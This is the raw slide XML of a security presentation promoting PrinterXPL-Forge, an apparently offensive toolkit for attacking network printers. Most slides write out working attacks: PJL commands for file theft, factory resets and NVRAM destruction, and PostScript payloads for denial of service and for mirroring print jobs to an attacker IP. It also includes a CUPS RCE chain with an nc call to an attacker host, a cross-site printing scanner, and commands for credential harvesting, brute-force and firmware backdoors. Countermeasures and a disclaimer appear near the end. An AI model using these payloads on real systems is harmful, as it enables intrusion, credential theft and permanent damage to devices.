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Exploiting Network Printers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>via PrinterXPL-Forge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DCDCDC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A comprehensive security research presentation — 2002 to 2025</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>André Henrique (@mrhenrike) | União Geek</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="DCDCDC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PrinterXPL-Forge v3.14.0  ·  github.com/mrhenrike/PrinterXPL-Forge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1.  Why Printers?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2.  Yet Another T in the IoT?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3.  How to Print?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4.  What to Attack?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5.  Printer Languages (PJL, PS, PCL)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6.  Network Protocols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7.  Attacker Models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8.  Four Attack Classes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9.  DoS Attacks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10. Protection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11. Print Job Manipulation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12. Information Disclosure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13. Network Attacks (Extended)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14. Windows Print Spooler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15. Updated Attack Matrix (2025)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16. PrinterXPL-Forge Architecture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17. PRET Architecture Reference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18. Tool Comparison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19. Countermeasures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20.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Printers?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The overlooked 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Always-on  —  Printers run 24/7, rarely rebooted or patched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No endpoint security  —  No AV, no EDR, no application whitelist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Turing-complete  —  PostScript is a full programming language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Trusted position  —  Inside the firewall, on the corporate LAN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Rich data store  —  Address books, stored jobs, LDAP/SMB creds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IoT scale  —  700,000+ HP LaserJets on Shodan alone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Overlooked in assessments  —  Rarely included in pentest scope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Shodan: HP LaserJet → 700,000+  |  Brother MFC → 200,000+  |  Ricoh Aficio → 120,000+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Yet Another T in the IoT?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Printers are full-featured embedded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CPU  :  ARM Cortex-A or MIPS, 500 MHz–1 GHz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OS   :  Embedded Linux / VxWorks / proprietary RTOS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RAM  :  128 MB – 2 GB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Flash:  256 MB – 4 GB NAND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Stack:  TCP/IP, HTTP/S, SNMP, SMB, FTP, LDAP, WSD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Languages: PostScript interpreter, PJL parser, PCL engine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Services exposed (default):  80, 443, 9100, 631, 161/UDP, 515, 445, 21, 23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→  Equivalent attack surface to a low-power Linux server with no security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Print?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Channels and languages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USB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USB CDC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Physical only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RAW/JetDirect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9100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⚠ No auth, no encryption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IPP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HTTP/1.1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631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TLS optional, rarely enforced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LPD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Legacy, no auth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SMB/WinPrint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SMB2/3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445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PrintNightmare vector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HTTP Web UI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HTTP/HTTPS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80/443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Admin panel, default creds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FTP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FTP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Firmware update, file storage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Telnet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Telnet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Legacy mgmt, default creds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WSD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HTTP/UDP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3702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Windows auto-discovery, no auth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to Attack?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Printer attack surface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PrintingUnit → PJL Interpreter → RAW :9100 / IPP :631 / LPD :515 / SMB :445 / HTTP :80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2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→ PS  Interpreter  → (same channels)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2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→ PCL / PDF / ESC/P→ (same channels)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Every channel accepts raw language data  →  no authentication by default on port 9100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Attack entry points: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RAW :9100  — direct PJL / PostScript / PCL injection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IPP :631   — CUPS/IPP RCE chain (CVE-2024-47176)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HTTP :80   — admin panel, credential brute-force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SNMP :161  — MIB dump, community string brute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SMB :445   — PrintNightmare (CVE-2021-1675/34527)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WSD :3702  — passive discovery, SSRF pivot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PJL — Printer Job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Not limited to job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347472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@PJL INFO ID                              ; fingerprint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FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535  ; list filesystem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FSDOWNLOAD FORMAT:BINARY SIZE=512 NAME="0:\etc\passwd"  ; read file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FSUPLOAD   FORMAT:BINARY SIZE=1024 NAME="0:\evil.pjl"   ; write file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DEFAULT COPIES=9999                 ; NVRAM pollution (DoS)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DMCMD ASCIIHEX="040006020501010301040105"  ; factory reset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SET SERVICEPASSWORD=                ; clear service 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00C800"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PrinterXPL-Forge:  python printerxpl-forge.py 192.168.1.100 pjl info id</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python printerxpl-forge.py 192.168.1.100 pjl ls /</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python printerxpl-forge.py 192.168.1.100 pjl nvram read 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PostScript — Turing-Complete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Full programming language with file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1148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% Enumerate filesystem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(/*) { = } 128 string filenameforall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% Read /etc/passwd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(%rom0%/etc/passwd) (r) file { dup read {=} {pop exit} ifelse } loop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% DoS — infinite loop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{} loop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% Exfiltrate data to attacker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(192.168.1.10) 9999 (w) file  (SECRET DATA) writestring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Network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RAW · IPP · LPD · SNMP · SMB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RAW :9100 (JetDirect)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No authentication, no TLS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Accepts any PJL/PS/PCL data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Direct NVRAM access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IPP :631 (Internet Printing Protocol)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HTTP-based (RFC 2911)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TLS optional, rarely enforced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CUPS/IPP RCE chain (2024)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LPD :515 (Line Printer Daemon)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RFC 1179, no authentication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Job cancel and queue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SNMP :161 (UDP)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Community string: public/private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Full printer MIB exposed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Serial numbers, admin email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SMB :445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Windows print spooler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PrintNightmare vector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NTLM coercion via MS-RPRN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HTTP :80 / HTTPS :443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Admin panel brute-force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SOAP/REST credential extraction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LDAP/SMTP pass-back config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Attacker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Physical · Network · Web (XSP)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1. PHYSICAL ATTACKER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USB data injection  →  Panel access  →  Stored job retrieval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2. NETWORK ATTACKER  (primary model for PrinterXPL-Forge)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RAW:9100 PJL/PS inject  →  IPP CUPS RCE  →  SNMP MIB dump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HTTP admin brute-force  →  LDAP pass-back  →  SMB NTLM coerce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SSRF pivot via IPP  →  WSD discovery  →  Firmware upload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3. WEB / BROWSER ATTACKER  (Cross-Site Printing)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Victim browser loads malicious page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CORS XHR scan (BeEF technique) discovers printers on LAN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JavaScript POSTs PostScript job to printer port 9100/631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Physical paper output contains attacker-controlled content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Module: xpl/research/research-xsp-beef  (BeEF CORS technique)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 Attack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Müller et al. (BlackHat 2017) + 2025 extensions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0233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Reversible?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Denial of Service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PS {} loop, NVRAM exhaustion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Often NO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Protection Bypass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Factory reset via PJL DMCMD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 Job Manipulation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Capture, replay, showpage redefinition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Contextual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Information Disclosure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PJL filesystem, SNMP MIB, address book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Credential Harvesting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LDAP pass-back, NTLM coerce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Remote Code Execution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CUPS/IPP chain, Lexmark SSRF→RCE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Firmware Attacks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DLM injection, downgrade, rootkit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Lateral Movement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SSRF via IPP, WSD pivot, printed hashes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Denial of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PS infinite loop · NVRAM exhaustion · paper jam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PostScript infinite loop (recovery requires power cycle)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%!PS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{} loop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PJL NVRAM exhaustion (permanent hardware damage on some models)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CVE-2024-51982 (Brother HL-L2315DW), CVE-2014-3741 (generic)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DEFAULT COPIES=9999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DEFAULT MEDIASIZE=A4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[...repeated 10,000 times...]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PrinterXPL-Forge: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python printerxpl-forge.py 192.168.1.100 --exploit research-ps-infinite-loop --check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python printerxpl-forge.py 192.168.1.100 --exploit research-brother-nvram --check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Protection Bypass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Factory reset · LDAP pass-back · SNMP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PJL Factory Reset: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@PJL DMCMD ASCIIHEX=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"040006020501010301040105"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Resets ALL settings including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configured access passwords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PJL Service Password Clear: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@PJL SET SERVICEPASSWORD=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SNMP Factory Reset (HP):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snmpset -v1 -c public IP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enterprises.hp.nm...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configResetFactory.0 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LDAP Pass-Back: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Printer configured for LDAP auth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Attacker runs rogue LDAP server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Printer sends PLAINTEXT creds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Module: research-ldap-hash-capture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Module: research-mirage-rogue-ldap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Affected vendors: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HP · Ricoh · Xerox · Konica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Brother · Sharp · Canon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Kyocera · Lexmark · Toshiba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Print Job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Capture · Replay · Showpage redefinition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Capture jobs (passive, port 9100 / 515)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sudo tcpdump -i eth0 -w printer.pcap port 9100 or port 515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--pcap-extract printer.pcap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PostScript showpage redefinition (any future job mirrored to attacker)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%!PS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/showpage {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(192.168.1.10) 9999 (w) file exch writestring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showpage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} def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Retrieve stored jobs via FTP / HTTP / PJL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ftp ls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http get /hp/device/Jobs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Information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PJL filesystem · SNMP MIB · address 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PJL filesystem enumeration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@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535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Interesting paths: 0:\etc\shadow  0:\var\spool  0:\webServer\config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PostScript file enumeration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(/*) { = } 128 string filenameforall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(%rom0%/etc/passwd) (r) file { dup read {=} {pop exit} ifelse } loop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SNMP MIB dump (serial, admin email, firmware version)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snmpwalk -v2c -c public 192.168.1.100 | grep -i -E "admin|pass|serial"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Address book / credential extraction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research-ricoh-ldap-passback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research-konica-soap-extract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research-canon-ldif-extract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Network Attacks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SSRF · CUPS/IPP RCE · XSP · WSD · NTLM Coerce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SSRF via IPP  —  Printer as SSRF proxy reaching internal services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printer-uri: ipp://internal-server:631/ipp/print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CUPS/IPP RCE (2024)  —  CVE-2024-47176 + CVE-2024-47076 + CVE-2024-47175 + CVE-2024-47177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Unauthenticated RCE: UDP packet → cups-browsed → malicious IPP → command injection as lp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CVSS 9.9  |  Module: msf-cups-rce-2024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Cross-Site Printing (BeEF XSP)  —  Browser-based attack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JS CORS scan (BeEF cross_origin_scanner_cors) discovers printers on LAN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POSTs PostScript job → physical printout  |  Module: research-xsp-beef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NTLM Coercion via MS-RPRN  —  Module: research-ms-rprn-coerce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Forces printer to authenticate to attacker's SMB → NTLMv2 hash capture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WSD Discovery  —  UDP/3702, no auth, reveals all printer capabilities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--wsd-discover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Print Spooler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PrintNightmare · SpoolFool · PrintDemon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754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CVE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CVSS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CVE-2021-1675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PrintNightmare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RCE (unauth domain user)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CVE-2021-34527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PrintNightmare 2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RCE (patch bypass)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CVE-2022-21999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SpoolFool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LPE (race condition)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CVE-2020-1048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PrintDemon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LPE (port definition)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CVE-2022-38028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Forest Blizzard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LPE (APT28 in-the-wild)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CVE-2021-36958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Spooler variant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RCE (no auth in configs)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CVE-2023-21678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Spooler LPE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LPE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CUPS / IPP RCE Chain (2024)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CVE-2024-47176 + CVE-2024-47076 + CVE-2024-47175 + CVE-2024-47177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1.  Attacker sends UDP packet to cups-browsed port 631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echo '0 3 http://attacker:12345/lol' | nc -u -w1 192.168.1.100 631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2.  cups-browsed connects to attacker's IPP server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python malicious_ipp_server.py --port 12345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3.  Attacker returns malicious cups-filters attribute (FoomaticRIPCommandLine)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FoomaticRIPCommandLine: id &gt; /tmp/pwned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4.  When any user prints → lp user executes command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CVSS: 9.9  |  Unauthenticated  |  No user interaction (on trigger)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PrinterXPL-Forge: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python printerxpl-forge.py 192.168.1.100 --exploit msf-cups-rce-2024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Updated Attack Matrix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20 vendors × 10 attack classes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4114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Fctry Reset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Job Capture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FS Enum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Cred Harvest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RCE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Win Spooler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Firmware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HP LaserJet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Xerox WorkCentre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Xerox VersaLink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Canon iR-ADV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Ricoh Aficio/MP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Konica bizhub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Brother MFC/HL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Kyocera ECOSYS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Lexmark (2023)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CUPS (Linux)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2025 CVE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Most critical printer vulnerabilities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754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CVE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CVSS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CVE-2025-26506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HP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XPS buffer overflow RCE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CVE-2025-14232/35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Canon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PostScript/PCL buffer overflow RCE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CVE-2024-47176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CUPS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IPP RCE chain (unauthenticated)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CVE-2024-6333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Xerox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VersaLink command injection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CVE-2024-51977/78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Brother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Serial number disclosure + pwd derive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CVE-2023-26067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Lexmark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SSRF → internal API RCE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CVE-2023-23560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Lexmark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SSRF arbitrary file write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CVE-2022-1026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Kyocera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Net View SOAP credential dump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PrinterXPL-Forge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Modular Python 3 printer security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Language support :  PJL · PostScript · PCL · ESC/P · auto-detect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Protocol support :  RAW:9100 · IPP:631 · LPD:515 · SMB:445 · HTTP/S · SNMP · FTP · Telnet · WSD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CVE Database     :  50+ CVEs offline + NVD API live lookup + CVSS scoring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Exploit library  :  93 modules  (23 ExploitDB · 19 Metasploit · 51 Research)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Brute-force      :  HTTP · FTP · SNMP · Telnet — wordlist-driven, 0 hardcoded creds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Fingerprinting   :  Multi-protocol banner grab + ML classifier + Praeda 117-sig database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Discovery        :  SNMP sweep · Shodan · Censys · FOFA · ZoomEye · Netlas · WSD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Lateral movement :  LDAP pass-back · NTLM coerce · SSRF/WSD pivot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Firmware         :  Version extract · upload endpoint · NVRAM R/W · DLM injection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Cross-Site Print :  HTML XSP lure generator (BeEF CORS technique)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Windows          :  Full support — PowerShell launchers, EDR-safe venv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Python           :  3.8+ (typed, async-capable)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PrinterXPL-Forge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Layered modular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75488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User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└─ printerxpl-forge.py  (CLI / TUI Menu)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├─ core/      Discovery · Capabilities · AttackOrchestrator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├─ modules/   PJL · PostScript · PCL · BruteForce · PrintJob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├─ protocols/ RAW · IPP · LPD · SMB · Firmware · SSRF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└─ utils/     VulnScanner · ExploitMgr · CVELoader · OnlineDiscovery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├─ src/data/cve_catalog.json   (50+ CVEs)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└─ xpl/index.json              (93 modules)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     ├─ xpl/edb-*/      23 ExploitDB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     ├─ xpl/msf-*/      19 Metasploit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     └─ xpl/research-*/ 51 Original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PRET Architecture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Müller et al., BlackHat USA 2017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75488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 User command                                  PJL Request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/ls                                           @PJL FSDIRLIST NAME="0:\"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                                            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┌──────────────────────────────────┐        PJL Response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PRET                             │        . TYPE=DIR   .. TYPE=DIR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┌──────────┐   ┌────────────┐  │        PostScript TYPE=DIR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│ Attacker │──▶│ Connector  │──┼──▶     PJL TYPE=DIR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└─────┬────┘   └────────────┘  │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      │                         │        PostScript Response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┌─────▼──────────┐  ┌────────┐ │        (%disk0%../device.html)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│  Translator    │  │Logging │ │        (%disk0%../java.login.config)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│  │  PJL │ PS │Fuz │  └────────┘ │        (%disk0%../config/soe.xml)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 └──┴────────────────┴─────────────┘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Tool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PRET · Praeda · PFT · BeEF · PrinterXPL-Forge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005A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PRET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Python 2.7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PJL/PS/PCL interactive shell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Unmaintained (2020)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Fork base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Praeda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Perl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HTTP MFP credential harvester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_PRAEDA_SIGNATURES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PFT (Phenoelit)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PJL/PS fuzzer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Archived (2002)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Inspiration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BeEF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Ruby/JS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CORS XHR printer scanner + XSP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research-xsp-beef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PRET-2.0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PRET update with more models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Active fork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research-pret-2.0-wrapper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psploit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PS/PJL capabilities fingerprint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_PSPLOIT_CAPABILITIES</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="2323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PrinterXPL-Forge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Full framework: 93 modules, 50+ CVEs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Active (this tool)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Credential Harvesting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LDAP pass-back · SMTP · NTLM · Default creds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LDAP Pass-Back (Ricoh, Sharp, Xerox, HP, etc.)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docker run -d -p 389:389 mrhenrike/mirage-rogue-ldap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research-ldap-hash-capture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→ Printer sends plaintext LDAP bind credentials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SMTP Pass-Back (Sharp MX, Ricoh, Konica)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research-sharp-smtp-passback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→ Printer sends SMTP AUTH LOGIN credentials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NTLM Coercion via MS-RPRN (SMB :445)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research-ms-rprn-coerce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→ NTLMv2 hash → pass-the-hash or crack offline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Default credential brute-force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192.168.1.100 --brute --wordlist wordlists/default_creds.txt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Firmware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DLM injection · downgrade · rootkit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Xerox WorkCentre — DLM (Downloadable Module) injection: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192.168.1.100 --exploit research-xerox-pjl-dlm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PJL FSUPLOAD writes DLM binary → persistent backdoor after reboot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Xerox firmware rootkit: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192.168.1.100 --exploit research-xerox-firmware-root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Tampers firmware update process → persistent root access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NVRAM exhaustion (Brother):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192.168.1.100 --exploit research-brother-nvram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CVE-2024-51982 — permanent hardware damage via repeated NVRAM writes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Firmware analysis workflow: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192.168.1.100 --firmware-check</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"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python printerxpl-forge.py 192.168.1.100 pjl nvram read all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Cross-Site Printing (XSP)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BeEF CORS technique — browser-based printer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57200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/* BeEF-derived CORS LAN printer scanner (research-xsp-beef) */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/* Source: beefproject/beef modules/network/cross_origin_scanner_cors */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var PRINTER_PORTS = [9100, 631, 80, 515];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var candidates = [];  // LAN IPs: 192.168.1.x, 10.0.0.x ...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function corsScan(ip, port, callback) {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var xhr = new XMLHttpRequest();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xhr.open('GET', 'http://' + ip + ':' + port + '/', true);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xhr.onerror = function() { callback(ip, port, true); };  // CORS=open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  xhr.send(null);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}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// When printer found → POST PostScript job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function sendPrintJob(ip, port) { xhr.send(PS_PAYLOAD); }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xsp generate --output /var/www/html/lure.html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PrinterXPL-Forge —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From discovery to exploitation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475488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1. Online discovery (Shodan)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--shodan --dork "HP LaserJet" --country US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2. Local SNMP sweep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--scan 192.168.1.0/24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3. Fingerprint a specific target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192.168.1.100 --scan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Output: HP LaserJet Pro M404n  |  CVE-2021-39237 (CVSS 9.8)  |  PJL-FS enabled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4. Exploit matched CVE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edb-hp-jetdirect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5. Extract filesystem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pjl ls /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pjl get /webServer/config/soe.xml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6. Report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192.168.1.100 --report --output report.json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Praeda — MFP Fingerprint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117-signature HTTP harvester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Praeda (percx/Praeda) — Perl HTTP scanner for multi-function printers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Signature format: ID | Page title | Server header | Module IDs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Integration in PrinterXPL-Forge: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src/utils/banner_grabber.py → _PRAEDA_SIGNATURES dict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85+ printer/appliance signatures ported to Python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Function: praeda_match(title, server) → match dict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Coverage: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HP ChaiSOE / Virata-EmWeb — LaserJet, OfficeJet, Photosmart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Xerox Allegro RomPager / Xerox_MicroServer / Apache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Canon SNMP, Konica SNMP, Kyocera SNMP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Sharp Rapid Logic, Ricoh Web-Server, Lexmark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Toshiba TEC / Spyglass / Allegro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Used in: --scan fingerprinting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Countermeasures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How to protect against printer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CRITICAL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VLAN-isolate all printers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Block port 9100 from internet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Disable PostScript if not needed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Disable PJL filesystem commands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Change ALL default credentials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Patch PrintNightmare immediately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HIGH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Deny printer→LDAP/SMTP unless needed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Use SNMPv3 with authentication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Disable FTP and Telnet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Enable HTTPS, disable HTTP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Enable firmware signing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MEDIUM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Log all print jobs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Alert on PJL filesystem commands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Monitor printer LDAP/SMTP connections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Subscribe to vendor advisories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PJL hardening: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@PJL SET LPARM:PJL SECURITY=ON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@PJL SET LPARM:PJL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2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FILEFSUPDATELOCK=ON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CUPS hardening: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systemctl disable cups-browsed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BrowseLocalProtocols none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BrowseRemoteProtocols none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800"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2002–2025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Foundational Research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Phenoelit — CCC 2002 (PJL/PS DoS)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FX — 29C3 2002 (printer exploitation)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Heuse — DEFCON 20 2012 (HP printers)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Müller et al. — BlackHat 2017 (PRET)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hacking-printers.net — 2017 wiki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Tools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PRET (RUB-NDS/PRET)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Praeda (percx/Praeda)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BeEF (beefproject/beef)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psploit, PRET-2.0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PrinterXPL-Forge (this tool)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Critical CVEs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CVE-2021-1675/34527 PrintNightmare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CVE-2024-47176 CUPS/IPP RCE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CVE-2025-26506 HP XPS RCE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CVE-2025-14232/35 Canon RCE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CVE-2024-6333 Xerox cmd inject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CVE-2024-51977/78 Brother serial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CVE-2023-26067 Lexmark SSRF→RCE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CVE-2022-21999 SpoolFool LPE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CVE-2018-5924/25 FAXPLOIT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Full list in:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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docs/Exploiting-Network-Printers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2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-via-PrinterXPL-Forge.md §21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Quick Reference — PrinterXPL-Forge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5212080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121212"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00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C800"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t># Discovery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--scan 192.168.1.0/24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--shodan --dork "HP LaserJet"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Fingerprint + CVE match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192.168.1.100 --scan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PJL operations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pjl info id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pjl ls /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pjl nvram read all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Exploitation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research-ldap-hash-capture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192.168.1.100 --exploit msf-printnightmare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Brute-force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192.168.1.100 --brute --wordlist wordlists/default_creds.txt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/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# Report</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1250">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python printerxpl-forge.py 192.168.1.100 --report --output report.json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Network printers are high-value, low-security targets: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Turing-complete languages with OS-level access (PJL, PostScript)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No authentication on port 9100 by default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Rich credential stores (LDAP, SMTP, SMB, address books)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PrintNightmare still unpatched in many environments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New high-severity CVEs every year (2024: CUPS 9.9; 2025: HP/Canon 8.8)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PrinterXPL-Forge provides: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93 exploit modules across 10+ vendor families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50+ CVEs with auto-matching fingerprinting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LDAP/SMTP/NTLM credential harvesting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BeEF-derived Cross-Site Printing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Praeda 117-signature MFP fingerprint database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• Full documentation: docs/Exploiting-Network-Printers-via-PrinterXPL-Forge.md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https://github.com/mrhenrike/PrinterXPL-Forge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Questions?</a:t>
            </a:r>
          </a:p>
          <a:p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/>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="00C800"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>André Henrique (@mrhenrike) | União Geek</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="DCDCDC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>github.com/mrhenrike/PrinterXPL-Forge</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="DCDCDC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>github.com/Uniao-Geek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Legal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31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This presentation and the PrinterXPL-Forge framework are intended EXCLUSIVELY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for use on systems you own or have EXPLICIT WRITTEN PERMISSION to test.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Unauthorised use against third-party systems is ILLEGAL under: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Computer Fraud and Abuse Act (CFAA) — USA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Computer Misuse Act — UK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Lei 12.737/2012 (Lei Carolina Dieckmann) — Brazil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EU Directive 2013/40/EU on attacks against information systems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• ... and equivalent legislation worldwide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The authors accept NO liability for misuse.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All CVEs, exploit techniques, and tool integrations are described for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EDUCATIONAL and DEFENSIVE SECURITY purposes only.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MIT License — see LICENSE file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